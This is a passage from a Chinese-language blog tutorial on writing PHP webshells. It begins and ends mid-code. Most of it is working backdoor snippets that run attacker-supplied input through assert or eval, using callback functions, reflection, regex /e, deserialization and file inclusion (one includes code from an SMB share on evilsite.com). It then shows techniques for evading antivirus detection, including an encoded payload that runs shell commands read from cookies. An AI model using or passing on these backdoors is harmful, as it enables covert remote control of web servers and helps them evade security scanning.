<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">register_tick_function</span>(<span class="variable">$e</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>register_shutdown_function</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">register_shutdown_function</span>(<span class="variable">$e</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>mb_ereg_replace</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_ereg_replace</span>(<span class="string">&#x27;.*&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;e&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>mb_ereg_replace_callback</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_ereg_replace_callback</span>(<span class="string">&#x27;.+&#x27;</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>),<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>array_reduce</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;k&#x27;</span>]),<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return assert($b);&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="variable">$arr</span>, <span class="variable">$e</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>set_exception_handler</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">set_exception_handler</span>(<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;return assert($_GET[k]);&#x27;</span>));</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_ invoke__">exception</span>();</span><br></pre></td></tr></table></figure>

<p>forward_static_call</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">forward_static_call</span>(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$args</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">a</span>(<span class="variable">$_POST</span>[k]);</span><br></pre></td></tr></table></figure>

<p>iterator_apply</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">iterator_apply</span>(<span class="keyword">new</span> <span class="title function_ invoke__">arrayiterator</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>])),<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;Iterator $i&#x27;</span>,<span class="string">&#x27;assert($i-&gt;current());&#x27;</span>),<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title function_ invoke__">arrayiterator</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]))));</span><br></pre></td></tr></table></figure>

<p>array_intersect_ukey</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_intersect_ukey</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>array_uintersect_uassoc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_uintersect_uassoc</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[k]),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;strstr&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>array_intersect_uassoc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_intersect_uassoc</span>(<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;&#x27;</span>),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>filter_var</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="string">&quot;phpinfo();&quot;</span> ,<span class="number">1024</span>, <span class="keyword">array</span>(<span class="string">&quot;options&quot;</span> =&gt; <span class="string">&quot;assert&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>filter_var_array</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure>

<p>preg_replace_callback</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;/. /i&#x27;</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>无回显回调后门ob_start</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure>

<p>create_function创建回调函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$mem</span> = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$mem</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">11211</span>, <span class="literal">TRUE</span>, <span class="number">100</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="literal">TRUE</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b,$c,$d,$e&#x27;</span>, <span class="string">&#x27;return assert($a);&#x27;</span>));</span><br><span class="line"><span class="variable">$mem</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="number">11211</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>CallbackFilterIterator创建回调函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>],)), <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>, <span class="string">&#x27;assert($a);&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$iterator</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">echo</span> <span class="variable">$item</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>session_set_save_handler</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$para</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_set_save_handler</span>(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="variable">$para</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;destroy&quot;</span>, <span class="string">&quot;gc&quot;</span>);</span><br><span class="line">    @<span class="title function_ invoke__">session_start</span>(); <span class="comment">// 打开会话</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$session</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">// open第一个被调用，类似类的构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$save_path</span>, <span class="variable">$session_name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// close最后一个被调用，类似 类的析构函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行session_id($_REQUEST[&#x27;op&#x27;])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST[&#x27;op&#x27;])</span></span><br><span class="line"><span class="title function_ invoke__">session_id</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;op&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$sess_data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第三个参数为read  read(string $sessionId)</span></span><br><span class="line"><span class="title function_ invoke__">test</span>(<span class="variable">$session</span>);</span><br></pre></td></tr></table></figure>

<p>还有一些扩展中的回调函数如sqlite&#x2F;pdo&#x2F;yaml&#x2F;memcached等</p>
<p>PDO数据库回调</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:sqlite.db3&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">sqliteCreateFunction</span>(<span class="string">&#x27;myfunc&#x27;</span>, <span class="variable">$e</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$sth</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT myfunc(:exec)&quot;</span>);</span><br><span class="line"><span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="string">&#x27;:exec&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>SQLite3 数据库回调</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;sqlite.db3&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">createFunction</span>(<span class="string">&#x27;myfunc&#x27;</span>, <span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT myfunc(?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], SQLITE3_TEXT);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure>

<p>php_yaml库</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="variable">$yaml</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">greeting: !<span class="subst">&#123;$str&#125;</span> &quot;|. |e&quot;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line"><span class="variable">$parsed</span> = <span class="title function_ invoke__">yaml_parse</span>(<span class="variable">$yaml</span>, <span class="number">0</span>, <span class="variable">$cnt</span>, <span class="keyword">array</span>(<span class="string">&quot;!<span class="subst">&#123;$_REQUEST[&#x27;pass&#x27;]&#125;</span>&quot;</span> =&gt; <span class="string">&#x27;preg_replace&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>回调函数这里是无穷无尽的</p>
<h2 id="4-反射技术"><a href="#4-反射技术" class="headerlink" title="4.反射技术"></a>4.反射技术</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="variable">$_GET</span>[m]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$func</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[c]));</span><br></pre></td></tr></table></figure>

<p>这种方式调用起来也非常的简单<code>xx.com/shell.php?m=assert&amp;c=phpinfo();</code>和动态函数执行的方式十分的相似。但是目前这种方式已经被各种安全防护软件识别了。</p>
<h2 id="5-正则-e-模式"><a href="#5-正则-e-模式" class="headerlink" title="5.正则 \e 模式"></a>5.正则 \e 模式</h2><p>这本是 php 中可能存在的命令执行漏洞的位置，使用 <code>\e</code> 将替换串中的内容当作代码来执行。</p>
<p>常用作一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/e&#x27;</span>,<span class="string">&#x27;\\1&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<h2 id="6-反序列化执行"><a href="#6-反序列化执行" class="headerlink" title="6.反序列化执行"></a>6.反序列化执行</h2><p>与正则 \e 模式想法类似，使用不安全的处理方式构成代码执行漏洞，用作webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>=<span class="string">&quot;text&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file_name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>

<p>我们需要在本地构造序列化的数据。构造好了之后，通过<code>shell.php?id=id=O:3:&quot;foo&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code>，这样就能够执行<code>phpinfo();</code>命令了</p>
<h2 id="7-文件引入"><a href="#7-文件引入" class="headerlink" title="7.文件引入"></a>7.文件引入</h2><p>PHP 中使用 include 引入的文件将会以 php 代码进行解析</p>
<p>因此可以通过引入的方法将恶意代码存留在其他位置</p>
<p>远程文件包含，这个不多说，需要开配置</p>
<p>本地文件包含引入 ntfs 流：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;aaa.png&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>在 aaa.png 中写入恶意代码</p>
<p>包含smb共享文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;\\\evilsite.com\1.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>这种只有Windows_PHP 服务器才可以利用UNC特性包含局域网SMB服务共享的文件，<a href="https://www.freebuf.com/articles/web/203577.html">https://www.freebuf.com/articles/web/203577.html</a></p>
<h1 id="过静态检测"><a href="#过静态检测" class="headerlink" title="过静态检测"></a>过静态检测</h1><p>那么接下来就是如何使我们的代码绕过各种杀软的检测呢？</p>
<h2 id="1-字符串处理"><a href="#1-字符串处理" class="headerlink" title="1.字符串处理"></a>1.字符串处理</h2><h3 id="1-字符串变形"><a href="#1-字符串变形" class="headerlink" title="(1) 字符串变形"></a>(1) 字符串变形</h3><p>字符串变形就是利用各种字符串处理函数将一些可能被杀软识别的关键字变形，做到通过简单正则无法识别的地步</p>
<p>以下为一些常见的处理函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ucwords</span>() <span class="comment">//函数把字符串中每个单词的首字符转换为大写</span></span><br><span class="line"><span class="title function_ invoke__">ucfirst</span>() <span class="comment">//函数把字符串中的首字符转换为大写</span></span><br><span class="line"><span class="title function_ invoke__">trim</span>() <span class="comment">//函数从字符串的两端删除空白字符和其他预定义字符</span></span><br><span class="line"><span class="title function_ invoke__">substr_replace</span>() <span class="comment">//函数把字符串的一部分替换为另一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">substr</span>() <span class="comment">//函数返回字符串的一部分</span></span><br><span class="line"><span class="title function_ invoke__">strtr</span>() <span class="comment">//函数转换字符串中特定的字符</span></span><br><span class="line"><span class="title function_ invoke__">strtoupper</span>() <span class="comment">//函数把字符串转换为大写</span></span><br><span class="line"><span class="title function_ invoke__">strtolower</span>() <span class="comment">//函数把字符串转换为小写</span></span><br><span class="line"><span class="title function_ invoke__">strtok</span>() <span class="comment">//函数把字符串分割为更小的字符串</span></span><br><span class="line"><span class="title function_ invoke__">str_rot13</span>() <span class="comment">//函数对字符串执行 ROT13 编码</span></span><br></pre></td></tr></table></figure>

<p>这部分看心情随便写，变法无穷无尽，下面仅列举几个简单例子：</p>
<p>替换</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="string">&#x27;$_PO&#x27;</span>.<span class="string">&quot;STasdasd[&quot;</span>.<span class="string">&#x27;1]&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$x</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;STasdasd&#x27;</span>,<span class="string">&quot;ST[&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>; <span class="variable">$x</span>&lt;=<span class="number">0</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$x</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将关键函数进行倒转和空格，之后利用<code>strrev</code>和<code>str_replace</code>恢复</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&quot;edoced_4&quot;</span>.<span class="string">&quot;6esab&quot;</span>);<span class="keyword">eval</span>(<span class="variable">$b</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = &quot;</span>)));</span><br></pre></td></tr></table></figure>

<p>str_rot13</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[errorpage]/e&quot;</span>, @<span class="title function_ invoke__">str_rot13</span>(<span class="string">&#x27;@nffreg($_CBFG[cntr]);&#x27;</span>), <span class="string">&quot;saft&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-字符串拼接"><a href="#2-字符串拼接" class="headerlink" title="(2) 字符串拼接"></a>(2) 字符串拼接</h3><p>字符串拼接的方式也常常用来分割危险关键字，由于PHP的灵活性，这种写法就有非常多</p>
<p>如下例，使用<code> .</code> 进行字符串拼接，利用可变函数调用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$k</span>=<span class="string">&quot;ass&quot;</span>.<span class="string">&quot;ert&quot;</span>; <span class="variable">$k</span>($&#123;<span class="string">&quot;_PO&quot;</span>.<span class="string">&quot;ST&quot;</span>&#125; [<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Y&quot;</span>.<span class="string">&quot;X&quot;</span>.<span class="string">&quot;N&quot;</span>.<span class="string">&quot;z&quot;</span>.<span class="string">&quot;Z&quot;</span>.<span class="string">&quot;X&quot;</span>.<span class="string">&quot;J&quot;</span>.<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>(@$&#123;<span class="string">&quot;_P&quot;</span>.<span class="string">&quot;O&quot;</span>.<span class="string">&quot;S&quot;</span>.<span class="string">&quot;T&quot;</span>&#125;[pass]);</span><br></pre></td></tr></table></figure>

<p>利用注释</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@<span class="variable">$_</span>=<span class="string">&quot;s&quot;</span>.<span class="string">&quot;s&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;e&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;r&quot;</span>;</span><br><span class="line">@<span class="variable">$_</span>=<span class="comment">/*-/*-*/</span><span class="string">&quot;a&quot;</span>.<span class="comment">/*-/*-*/</span><span class="variable">$_</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;t&quot;</span>;</span><br><span class="line">@<span class="variable">$_</span><span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">&quot;_P&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;OS&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;T&quot;</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>]); <span class="comment">// 密码-7</span></span><br></pre></td></tr></table></figure>

<p>除了用注释分隔关键字，还看到了一种玩法，不过已经挂了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">#eval($_);exit();</span></span><br><span class="line"><span class="variable">$_</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;?php #&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__FILE__</span>)));</span><br></pre></td></tr></table></figure>

<p>先声明字符串，之后通过从字符串中进行取值，得到所需要的敏感函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sF</span> = <span class="string">&quot;PCT4BA6ODSE_&quot;</span>;</span><br><span class="line"><span class="variable">$s21</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$sF</span>[<span class="number">4</span>] . <span class="variable">$sF</span>[<span class="number">5</span>] . <span class="variable">$sF</span>[<span class="number">9</span>] . <span class="variable">$sF</span>[<span class="number">10</span>] . <span class="variable">$sF</span>[<span class="number">6</span>] . <span class="variable">$sF</span>[<span class="number">3</span>] . <span class="variable">$sF</span>[<span class="number">11</span>] . <span class="variable">$sF</span>[<span class="number">8</span>] . <span class="variable">$sF</span>[<span class="number">10</span>] . <span class="variable">$sF</span>[<span class="number">1</span>] . <span class="variable">$sF</span>[<span class="number">7</span>] . <span class="variable">$sF</span>[<span class="number">8</span>] . <span class="variable">$sF</span>[<span class="number">10</span>]);</span><br><span class="line"><span class="variable">$s22</span> = $&#123;<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$sF</span>[<span class="number">11</span>] . <span class="variable">$sF</span>[<span class="number">0</span>] . <span class="variable">$sF</span>[<span class="number">7</span>] . <span class="variable">$sF</span>[<span class="number">9</span>] . <span class="variable">$sF</span>[<span class="number">2</span>])&#125;[<span class="string">&#x27;n985de9&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$s22</span>)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$s21</span>(<span class="variable">$s22</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>变形加拼接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_uU</span>=<span class="title function_ invoke__">chr</span>(<span class="number">99</span>).<span class="title function_ invoke__">chr</span>(<span class="number">104</span>).<span class="title function_ invoke__">chr</span>(<span class="number">114</span>);<span class="variable">$_cC</span>=<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">118</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">108</span>).<span class="variable">$_uU</span>(<span class="number">40</span>).<span class="variable">$_uU</span>(<span class="number">36</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">80</span>).<span class="variable">$_uU</span>(<span class="number">79</span>).<span class="variable">$_uU</span>(<span class="number">83</span>).<span class="variable">$_uU</span>(<span class="number">84</span>).<span class="variable">$_uU</span>(<span class="number">91</span>).<span class="variable">$_uU</span>(<span class="number">49</span>).<span class="variable">$_uU</span>(<span class="number">93</span>).<span class="variable">$_uU</span>(<span class="number">41</span>).<span class="variable">$_uU</span>(<span class="number">59</span>);<span class="variable">$_fF</span>=<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">114</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">97</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">101</span>).<span class="variable">$_uU</span>(<span class="number">95</span>).<span class="variable">$_uU</span>(<span class="number">102</span>).<span class="variable">$_uU</span>(<span class="number">117</span>).<span class="variable">$_uU</span>(<span class="number">110</span>).<span class="variable">$_uU</span>(<span class="number">99</span>).<span class="variable">$_uU</span>(<span class="number">116</span>).<span class="variable">$_uU</span>(<span class="number">105</span>).<span class="variable">$_uU</span>(<span class="number">111</span>).</span><br><span class="line"><span class="variable">$_uU</span>(<span class="number">110</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_fF</span>(<span class="string">&quot;&quot;</span>,<span 